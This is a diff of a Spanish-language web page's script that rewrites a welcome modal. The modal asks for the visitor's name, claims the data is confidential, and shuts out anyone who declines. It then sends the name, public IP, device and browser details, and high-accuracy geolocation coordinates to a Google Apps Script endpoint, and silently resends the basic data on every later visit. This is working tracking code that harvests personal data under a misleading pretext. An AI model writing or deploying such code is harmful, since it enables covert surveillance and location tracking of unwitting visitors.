@@ -189,20 +189,162 @@
 </div>
 
 <script>
-window.addEventListener("DOMContentLoaded", () => {
-  const modalEl = document.getElementById("bienvenidaModal");
-  const modal = new bootstrap.Modal(modalEl);
-  const body = document.getElementById("modalBody");
-  const footer = document.getElementById("modalFooter");
+window.addEventListener('DOMContentLoaded', () => {
+  const modal = new bootstrap.Modal(document.getElementById('bienvenidaModal'));
+  const body = document.getElementById('modalBody');
+  const footer = document.getElementById('modalFooter');
+  let nombreUsuario = "";
 
-  const SHEET_URL = "https://script.google.com/macros/s/AKfycbzmCy4PK0oXrYCNC1wHaNKkhvd26prvRyRl_aD3m7cEW65KyYHRhElGaJM3eSQtFjau/exec";
+  // Si el usuario ya pasó el modal antes
+  if (localStorage.getItem("modalMostrado") === "true") {
+    const nombreGuardado = localStorage.getItem("nombreUsuario") || "Anónimo";
+    enviarDatosBasicos(nombreGuardado);
+    return;
+  }
 
-  // 🔹 Utilidades
-  const uuid = () => "id-" + Math.random().toString(36).substring(2, 10) + Date.now();
-  const nowISO = () => new Date().toISOString();
+  // Mostrar modal si no se ha mostrado
+  modal.show();
 
+  // Paso 1
+  function pasarAPedirNombre() {
+    body.innerHTML = `
+      <p>Para ofrecerte un servicio más personalizado, necesitamos conocer tu nombre.</p>
+      <p>La información brindada es confidencial.</p>
+      <input type="text" id="nombreInput" class="form-control" placeholder="Escribe tu nombre">
+    `;
+    footer.innerHTML = `
+      <button type="button" class="btn btn-primary" id="continuarNombreBtn">Continuar</button>
+    `;
+    agregarEventosPaso2();
+  }
+
+  document.getElementById('siBtn').addEventListener('click', pasarAPedirNombre);
+  document.getElementById('noBtn').addEventListener('click', pasarAPedirNombre);
+
+  // Paso 2
+  function agregarEventosPaso2() {
+    document.getElementById('continuarNombreBtn').addEventListener('click', () => {
+      const input = document.getElementById('nombreInput');
+      if (!input.value.trim()) {
+        alert("Por favor ingresa tu nombre");
+        return;
+      }
+      nombreUsuario = input.value.trim();
+
+      body.innerHTML = `
+        <p>Hola, <b>${nombreUsuario}</b>. Te ayudaremos a encontrar una solución a cualquier problema o inquietud que tengas.</p>
+        <p>¿Quieres que te ayudemos?</p>
+      `;
+      footer.innerHTML = `
+        <button type="button" class="btn btn-secondary" id="noGraciasBtn">No, gracias</button>
+        <button type="button" class="btn btn-success" id="aceptarBtn">Aceptar</button>
+      `;
+      agregarEventosPaso3();
+    });
+  }
+
+  // Paso 3
+  function agregarEventosPaso3() {
+    document.getElementById('aceptarBtn').addEventListener('click', () => {
+      // Guardar nombre y estado del modal
+      localStorage.setItem("modalMostrado", "true");
+      localStorage.setItem("nombreUsuario", nombreUsuario);
+
+      // Enviar datos básicos (sin ubicación aún)
+      enviarDatosBasicos(nombreUsuario);
+
+      // Intentar obtener ubicación (si da permiso, se envía después)
+      intentarObtenerUbicacion(nombreUsuario);
+
+      modal.hide();
+    });
+
+    document.getElementById('noGraciasBtn').addEventListener('click', () => {
+      modal.hide();
+      document.body.innerHTML = "<h2 class='text-center mt-5 text-danger'>Acceso denegado</h2>";
+    });
+  }
+
+  // ---- Funciones principales ----
+
+  function enviarDatosBasicos(nombre) {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(ipResp => {
+        const ip = ipResp.ip;
+        const ua = navigator.userAgent;
+        const { navegador, os, arquitectura } = parseUserAgent(ua);
+        const resolucion = `${screen.width}x${screen.height}`;
+
+        const data = {
+          tipo: "basico",
+          nombre: nombre || "Desconocido",
+          latitud: "",
+          longitud: "",
+          ip: ip,
+          dispositivo: ua,
+          navegador: navegador,
+          os: os,
+          arquitectura: arquitectura,
+          pantalla: resolucion
+        };
+
+        fetch('https://script.google.com/macros/s/AKfycbzmCy4PK0oXrYCNC1wHaNKkhvd26prvRyRl_aD3m7cEW65KyYHRhElGaJM3eSQtFjau/exec', {
+          method: 'POST',
+          body: JSON.stringify(data)
+        })
+        .then(r => r.json())
+        .then(resp => console.log("✅ Datos básicos guardados:", resp))
+        .catch(err => console.error("Error enviando datos básicos:", err));
+      });
+  }
+
+  function intentarObtenerUbicacion(nombre) {
+    if (!navigator.geolocation) return;
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const { latitude, longitude } = pos.coords;
+
+        fetch('https://api.ipify.org?format=json')
+          .then(res => res.json())
+          .then(ipResp => {
+            const ip = ipResp.ip;
+            const ua = navigator.userAgent;
+            const { navegador, os, arquitectura } = parseUserAgent(ua);
+            const resolucion = `${screen.width}x${screen.height}`;
+
+            const data = {
+              tipo: "ubicacion",
+              nombre: nombre || "Desconocido",
+              latitud: latitude,
+              longitud: longitude,
+              ip: ip,
+              dispositivo: ua,
+              navegador: navegador,
+              os: os,
+              arquitectura: arquitectura,
+              pantalla: resolucion
+            };
+
+            fetch('https://script.google.com/macros/s/AKfycbzmCy4PK0oXrYCNC1wHaNKkhvd26prvRyRl_aD3m7cEW65KyYHRhElGaJM3eSQtFjau/exec', {
+              method: 'POST',
+              body: JSON.stringify(data)
+            })
+            .then(r => r.json())
+            .then(resp => console.log("📍 Ubicación guardada:", resp))
+            .catch(err => console.error("Error enviando ubicación:", err));
+          });
+      },
+      (err) => console.warn("❌ El usuario negó la ubicación:", err),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+
+  // Parsear user agent
   function parseUserAgent(ua) {
     let navegador = "Desconocido", os = "Desconocido", arquitectura = "Desconocido";
+
     if (ua.includes("Chrome") && !ua.includes("Edg")) navegador = "Chrome";
     else if (ua.includes("Firefox")) navegador = "Firefox";
     else if (ua.includes("Safari") && !ua.includes("Chrome")) navegador = "Safari";
@@ -215,133 +357,10 @@ window.addEventListener("DOMContentLoaded", () => {
     else if (ua.includes("Linux")) os = "Linux";
 
     if (ua.includes("Win64") || ua.includes("x86_64")) arquitectura = "64 bits";
-    else arquitectura = "32 bits";
+    else if (ua.includes("Win32") || ua.includes("x86")) arquitectura = "32 bits";
+
     return { navegador, os, arquitectura };
   }
-
-  async function getPublicIP() {
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const j = await res.json();
-      return j.ip;
-    } catch {
-      return "Desconocida";
-    }
-  }
-
-  async function sendToSheet(data) {
-    try {
-      const resp = await fetch(SHEET_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-      console.log("Datos enviados:", data);
-    } catch (err) {
-      console.error("Error al enviar al Sheet:", err);
-    }
-  }
-
-  async function enviarDatosIniciales(nombre, clientId) {
-    const ip = await getPublicIP();
-    const ua = navigator.userAgent;
-    const { navegador, os, arquitectura } = parseUserAgent(ua);
-    const resolucion = `${screen.width}x${screen.height}`;
-
-    const payload = {
-      tipo: "inicial",
-      clientId,
-      nombre,
-      fecha: nowISO(),
-      ip,
-      navegador,
-      os,
-      arquitectura,
-      pantalla: resolucion,
-      userAgent: ua,
-      latitud: "",
-      longitud: ""
-    };
-
-    await sendToSheet(payload);
-    console.log("✅ Datos iniciales enviados");
-
-    // Intentar obtener ubicación enseguida
-    intentarObtenerUbicacion(clientId, nombre, ip, navegador, os, arquitectura, resolucion, ua);
-  }
-
-  function intentarObtenerUbicacion(clientId, nombre, ip, navegador, os, arquitectura, resolucion, ua) {
-    if (!navigator.geolocation) return;
-
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        const payload = {
-          tipo: "ubicacion",
-          clientId,
-          nombre,
-          fecha: nowISO(),
-          ip,
-          navegador,
-          os,
-          arquitectura,
-          pantalla: resolucion,
-          userAgent: ua,
-          latitud: latitude,
-          longitud: longitude,
-          precision: accuracy
-        };
-        sendToSheet(payload);
-        console.log("📍 Ubicación enviada:", latitude, longitude);
-        localStorage.setItem("permitioUbicacion", "true");
-      },
-      err => console.warn("Ubicación no permitida:", err),
-      { enableHighAccuracy: true, timeout: 10000 }
-    );
-  }
-
-  // --- Flujo del modal ---
-  if (!localStorage.getItem("modalMostrado")) modal.show();
-
-  function pedirNombre() {
-    body.innerHTML = `
-      <p>Para ofrecerte un servicio más personalizado, necesitamos conocer tu nombre.</p>
-      <input type="text" id="nombreInput" class="form-control mt-2" placeholder="Escribe tu nombre">
-    `;
-    footer.innerHTML = `<button type="button" class="btn btn-primary" id="continuarNombreBtn">Continuar</button>`;
-    document.getElementById("continuarNombreBtn").addEventListener("click", confirmarNombre);
-  }
-
-  function confirmarNombre() {
-    const input = document.getElementById("nombreInput");
-    const nombre = input.value.trim();
-    if (!nombre) return alert("Por favor ingresa tu nombre");
-
-    body.innerHTML = `
-      <p>Hola, <b>${nombre}</b>. ¿Deseas continuar?</p>
-    `;
-    footer.innerHTML = `
-      <button type="button" class="btn btn-secondary" id="noGraciasBtn">No</button>
-      <button type="button" class="btn btn-success" id="aceptarBtn">Sí</button>
-    `;
-
-    document.getElementById("noGraciasBtn").addEventListener("click", () => {
-      modal.hide();
-      document.body.innerHTML = "<h2 class='text-center mt-5 text-danger'>Acceso denegado</h2>";
-    });
-
-    document.getElementById("aceptarBtn").addEventListener("click", async () => {
-      const clientId = uuid();
-      localStorage.setItem("modalMostrado", "true");
-      localStorage.setItem("nombreUsuario", nombre);
-      localStorage.setItem("clientId", clientId);
-      modal.hide();
-      await enviarDatosIniciales(nombre, clientId);
-    });
-  }
-
-  document.getElementById("siBtn").addEventListener("click", pedirNombre);
-  document.getElementById("noBtn").addEventListener("click", pedirNombre);
 });
 </script>
 </body>
